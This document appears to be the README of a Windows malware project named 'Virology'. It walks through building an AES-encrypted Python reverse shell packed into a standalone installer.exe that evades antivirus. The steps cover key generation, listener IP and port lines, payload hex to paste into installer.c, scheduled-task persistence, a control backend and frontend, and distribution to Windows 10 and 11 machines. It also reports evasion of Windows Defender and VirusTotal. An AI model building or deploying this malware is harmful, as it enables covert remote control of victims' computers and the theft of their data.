# Virology Documentation

- [Main infection vector documentation](#main-infection-vector-documentation)
- [Overview](#overview)
- [Compilation prerequisites](#compilation-prerequisites)
- [Building](#building)
  - [Launch the gen\_keys.exe](#launch-the-gen_keysexe)
  - [Verify the revshell.py](#verify-the-revshellpy)
  - [Use the encrypt.exe](#use-the-encryptexe)
  - [Use the b2hex script :](#use-the-b2hex-script-)
  - [Replace the strings with the output of b2hex.py :](#replace-the-strings-with-the-output-of-b2hexpy-)
  - [Rebuild the program](#rebuild-the-program)
  - [Launch the backend](#launch-the-backend)
  - [Execute the built installer.exe](#execute-the-built-installerexe)
  - [Control the infected user](#control-the-infected-user)
- [Detection](#detection)
  - [Windows Defender](#windows-defender)
  - [VirusTotal](#virustotal)
  - [Hybrid Analysis](#hybrid-analysis)
  - [DocGuard](#docguard)
- [Removal](#removal)


# Overview

This directory serves as the entry point for the virus on the target machine. The goal is to avoid detection by common antivirus (AV) software while setting up a reverse shell for remote access.

The following workflow outlines how detection is avoided:

1. **Encryption and Payload**  
   - We encrypt a Python reverse shell script (the malicious payload revshell.py) using AES encryption.  
   - Additionally, a batch script is encrypted (install_python.bat), which downloads a Python embeddable, sets up pip and install necessary packages for later usage.

2. **Installer Execution**  
   - The encrypted batch code install_python.bat is first decrypted and executed. This is handled by `installer.c`.  
   - Its role is to decrypt the AES-encrypted, hex-encoded reverse shell code and batch script, and then execute them using the `system()` function.  
   - It also decodes the reverse shell program (`revshell.exe`), which is embedded as a hex string in the code, and writes it to the system, placing it next to the downloaded Python DLL. This is the program that will be executed by the windows scheduled task.

3. **Establishing Control**  
   - Once the reverse shell is established, remote control is gained over the infected machine, allowing the attacker to execute Python code directly on the system.  
   - The reverse shell sends connections back to the server, enabling orchestration of further processes.



# Compilation prerequisites

Install msys2 and launch the "mingw" application of it.
Download the latest libssl from https://openssl-library.org/source/, for windows 64
In msys2, cd into the extracted tarball of openssl
Run the following commands : 
```bash
./Configure
make
make install
```

Don't hesitate to read the docs in the extracted tarball for more information or troubleshooting (commands could change over time).

The installation will take some time.

You also need to install python from msys2 with this command : 

```bash
pacman -S mingw-w64-x86_64-python3.11
```

After that, open your windows environment variable settings so you can add the "C:\msys64\mingw64\bin" path to your PATH variable.

You need to download the right version of python (3.11.9 in my case), using this link : (https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip)[https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip]

Extract it, and copy the python311.dll into this directory.

Once done, you should be able to compile the 3 needed programs using the "c_build.ps1" script.

# Building

The executables are available in the executables directory.

## Launch the gen_keys.exe

You should see 2 files appearing: aes_key.bin and aes_iv.bin

Those are the initialization vector for AES and the key for encryption.

## Verify the revshell.py

Line 25-27 :

```python
s = context.wrap_socket(raw_socket, server_hostname="172.26.199.159")

s.connect(("172.26.199.159", 4242))
```

Put in there the listener connexion informations.

## Use the encrypt.exe 

This will use the previous generated files to encrypt and generate the encrypted_python_installer.bin and encrypted_revshell.bin

## Use the b2hex script : 

```powershell
python3 b2hex.py
```

You should see an output like : 

```
AES key:dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327
AES IV:d48e8f872066162eabde33152dc604c6
Encrypted reverse shell:2eeafe63e0262d9ac74f40d9528c870716153e6fb07c157929ef8385d8c5e758b9dab7f663e4aec0300ebdfd42d30d14387a426e87356c747ecc3f0868d670547cf1f84a4570fbed7a48d252e9872d2ae5a0c65e1903bda34799e5134fde592aecfff6c7bac2acb94600a8b733762a145ebe770a486ee70b91ab57686870fee72377acf3d58e03ee340fe024b1da4ea4241155a82eb8fbd80d2864694cb6976cf66d0c553eb8548b41da7d7890d273ed570abec879bb75f5a37c50f468a4f889d973cf8fa9e0f843af2de67173d178b8ddd5c5d46a0adeee5d432d1de941c4011c0d802a56dff76179bfec9f044a1f2ca3f73e4c0b932222cec373ffe52ce72a60c8742fdecbb0dfd23ec8730e6695346cb3db65ebf958b23dfab25d8e97c6c01e5ca40bd92f744004c0b826679b71c19e81705cb1787a5a3381a232c61b1a6fea4433590282e469886361e9c0df7bc2dd08891da3f2e83fa8c38ecca2d1fe7d12a06ef176b81f64a23f986998d58e8976d6229f7eb951e2c6a332720c90ed23d9b0d4fa8afaa1f0046371829e71eb948edbea82679d1a520f2b1e4b56ea9c70f1a8c06c0a55a8c8a120c05805275483c8c441447b2bab6ad634d5eb0668f189fb3c65cda161e6410b6661abee52105216552479ed25001092f4b9f85000848ba324cc3eec2a08e50742f8bfeccc3df6d40615055b97d2b88d0e5135aa21b1a25a525782def74f0107ed19c68d907e045014240ea4800eca462b23a4fa0be124bb992a1e3a9ef322f196f5c63d5986524c5f3c9fc09f975eca4f86b82a24fd102ec20025ff9f3db88fecc43e3bfd95777c9e92679f608f4cefff1be02db4161764f7fd1989a02dbc6bb9ba09b515db8199287dd11ca2d161607362a3c2c7192d15acced93b800fab3f41c5aff538e4e82934f7a04fd48da5d74290b43742f1fcd487ec385a7db46d239a3fda65b8cfb642c535f7af5b1fc3c2c85b0db7b2d77dd495cb12c97e10187a93214762de028dee4770f06bdcdaa73e8b0f19012efd680dad1eec63d9c94bf0f4f7e7699bd4b84324eed1a3d1a33f3e095e4463a54d95d671f52d5af6fd501588e17064cc69ae4a04b55d974085967d959b830c6bd5136400b016d035e51af932cd40e9e6c3be8de386da10dedd912d60cc9a4ea08023a2d9c7787cc3a5d01fb95804b40b7b86b6eb2da05275eeaa7bca90d2edd48aa4c4b3e21a4b0a44a77e4804ce6b955e61d75d5cb93f6f8f57aeed07efd1f07318ead11146c517fc7e0b3db3a33ad3e82671f4c41c6378db1b8f8581b8d68c177ab70801a14e2655a95fe110160a542664437f1bc19ee032273144920d5ce36a2377d658a5478874d5c086acafcef9f0ae4cb6e1863607d392316ccdd798bd1fc3ddca8b1ec2bb8fb68e9438039862294ccae27e94f45fbf837cd4b147e5cd3be435546d0e0d8033f24ae7b48c89411e06c37a950c44d3796b1e5984683e098f0ecf9b82538271ef44339a50f720b83dd0afed6863661cd17f8a254f5b4368e3fb2f4e56df8d7aff83f24f54178f27da2a125260b9bea5ce395f3693784ccdf2fd01d0bd39322951a25887a78f80a8511f95da61e722fa9febda8f3c3b9ee3348a6b1808c2b2502288e186d1b58114953907a160ad461b0a3243a97389c8006ed2031807721f9c7fa47fc7018bbedef6f6d591f1c160f9c7d7427836893484016e4f95df7da917f5bbcdf911774649f37a93f93579fc9f92c24475c87c27565cd32d2a2682eba1a3a85931ba251a2d94ddfb999780c6d48ccb4586e5062853ccc51342e74f34d6b0614c95bb54f0d03ec27258e8d445a18750a353d3fee2e588d01b2ec77e10805076155cb5a7307c2ac177e8533f25114d1bcdb52a775a62c6a6263e8c887f26503c1e75e11f8ed9fd49a3e0cba7407e266e8e2efdec35ff84064594f6f83dc567d1e2a912f33d7a7ce2
Encrypted python installer:f6a072cd9efe9d53281f7f620933d4faa7b08900af07f6c094f6df98442807f65f342aa122bd04ceaadbc3cd0928c9dfb62c4d938c0dcaae2c372d6db34d98795b9f76eb376abbc607d29b7975b3c75801faa30ffdca12b1d2adcdb8d325af7cab61d8ece387e19112be92fefc7876f58e4758b24862369b26edadbfce50942e2aa39685dfedb8d1d0baab8107ba71c032730fd92294bed3d6e5cd17c000786f9d70656645a060cab1b06b2b9c6f3e4d61addacf1d862cc612461ebce78e9551405be8d6f7e79b586571b8951a36f6b162629c15c88f42f78148cbb4f66026c4fbf64ac311740feda9b43dd65808cf6644893f0f594db69b243490215c92b76c15d5c5e8a42da00012f6ed235d7bde62ca5932e30d0dfb6d27aee5ad83b92e4c538fce9831b0bb7f273a78d9a7d2a40f2024d35332ca8517a91f9da1eb08af32811a244c9c0848533771dfc56666b90f91e1a43a57711a1c20d8c868cdcd128ca9ec9e402bb4c85763ba84f639a29d269e697dc485b281a689aea203aeda8351aafe3f87898bdc1003ec7b139c7b271908c6ae39cb83f37c75281bf3c7f5a1b2d016276d3bd10d98eac63fb5fa3c7579730581864d348224a12b828904473176c75a7f1afbd9d590a9d12ff4a460eccb6b0b34d315f91dc7bbe291fa98eba41c2cfb0d94e9f9ea6a4f6156908be764e59a86da6b844fce3d9d9578c29df219fd648ab6cd5924c0e5f22a2731fc012fc305d477bc1bed4d6734c41851894080a389210753bd29d845481f4e7416113e9ac7328dbdba60ca4849564de0a6045d06cab146394ea7f3366296bcbac08df4cd845a18fa268ffb9d231ac077ff30fa3b0edec2e9333db940df82e308506d3f35112e0ae715afe373f6cdb54da18abf2a60720e5e7ed37c6b6799f0a1a4966a72
```

Paste the hex values accordingly in the "installer.c" program, you should see those 4 variables at the beginning of the main function : 

```c
    unsigned char aes_key_hex[] = "1629bd347dde266394f1517f2902455c3c3a47e3fc73f964030a930daa375c5d";
    unsigned char aes_iv_hex[] = "c36ab274d5672ad175d0c2628ee27ca5";
    unsigned char input_hex_py[] = "...";
    const char revshell_data_hex[] = "...";

```

## Replace the strings with the output of b2hex.py :

- Encrypted python installer is input_hex_py
- AES key and AES IV are aes_key_hex and aes_iv_hex
- revshell_data_hex is the content of the generated "revshell_hex.txt" from the b2hex.py

## Rebuild the program 

Using the c_build.ps1 from a powershell.

## Launch the backend

Go into the "backend" directory and use `docker compose up` to start the required components.

## Execute the built installer.exe

If the backend is launched and accessible at hackstation.virology.fr, the computer will be infected and we can now control the user's PC with the frontend

The installer.exe is standalone, with no previous requirements. You can copy it, distribute it across windows 10 and 11 machines. Other executables and script are only used during build time.

## Control the infected user

Go into the "frontend" directory and launch the frontend with `docker compose up`

You should be able to use the control interface at http://localhost:3000



# Detection

## Windows Defender

Microsoft defender does not detect the installer, neither the reverse shell.

Though, during the tests, sometimes it detected the installer.exe later for a persistence technique and removed the exe.

This only happened after executing the installer multiple times, probably because it executes a MS-DOS code that creates a task that will execute the program every X minutes, so it is detected in runtime analysis.

In the end, the task was not deleted, and no more alerts were raised, as the virus kept running. 

Establishing persistency before installing the real code by separating the process into two distincts executables is a hiding technique from defender.

## VirusTotal

At the time of writing this document, the program is not flagged as possibly malicious :

[Link](https://www.virustotal.com/gui/file/2366781a097e23c90b7a06b0ffd9ac3e1fe0e3ea3e75d21cc2ddbba316c1ecdf?nocache=1)

![virustotal result installer.exe](imgs/installer_exe_virustotal.png)

Same for the revshell.exe (which is written on disk later on) : 

[Link](https://www.virustotal.com/gui/file/ebecbe39d471c4eea52bd3fdbd6c12ffef6d59d9b7bd5d0b3379af317b44bd80?nocache=1)

![virustotal result revshell.exe](imgs/revshell_exe_virustotal.png)

## Hybrid Analysis

![hybrid analyzer results sandboxed](imgs/installer_hybrid_analyzer_sandboxed.png)

![hybrid analyzer results static](imgs/installer_hybrid_analysis_static.png)

## DocGuard

DocGuard report: [link]([link](https://app.docguard.io/055e2622a4b51aea15bd9cb425dc35409f314f4f87815680f7a03cf367e2b087/639bf41b-4dfc-45f7-8273-521249eb9c9e/0/results/dashboard))

# Removal

To remove the virus, you have to delete the task used using the disable_persistency.bat script (double click on it), or manually using the windows task planner interface.

You can delete the files in C:\Temp to completely remove it, unless some commands used during the infection enables more persistency 👾


